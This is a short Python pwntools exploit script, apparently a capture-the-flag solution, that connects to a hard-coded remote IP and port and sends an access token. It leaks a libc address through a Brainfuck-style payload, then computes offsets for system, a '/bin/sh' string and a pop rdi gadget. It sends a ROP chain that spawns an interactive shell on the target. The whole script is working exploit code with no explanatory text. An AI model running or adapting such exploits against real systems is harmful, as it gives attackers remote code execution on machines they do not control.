from pwn import *


#remote
r = remote('120.55.86.95', 22222)
print r.recvuntil('=')
r.sendline("78696a70eb240b24fdee9ea87c12f811")


payload0  = ',[>,]'
payload0 += '>'*16
payload0 += '.>'*8	#leak
payload0 += '<'*9	#back
payload0 += ',>'*25	#input
payload0 += ']q'
r.sendline(payload0)


payload1 = '\xee'*0x207+'\x00'
r.recvuntil('OK\n')

r.sendline(payload1)
raw_input("print recv?")
rdata = r.recv(1024)
print rdata.encode('hex')
addr = (u64(rdata[:8]))
system = addr - 0x21EC5 + 0x0000000000046640
print 'system %x'%system
sh = addr - 0x21EC5 + 1559771
print 'sh %x'%sh

pop_rdi = addr - 0x21EC5 + 0x0000000000022b1a
print 'pop_rdi%x'%pop_rdi

payload2  = ''
payload2 += p64(pop_rdi)
payload2 += p64(sh)
payload2 += p64(system)
raw_input("send payload2?")
r.sendline(payload2)

	
r.interactive()
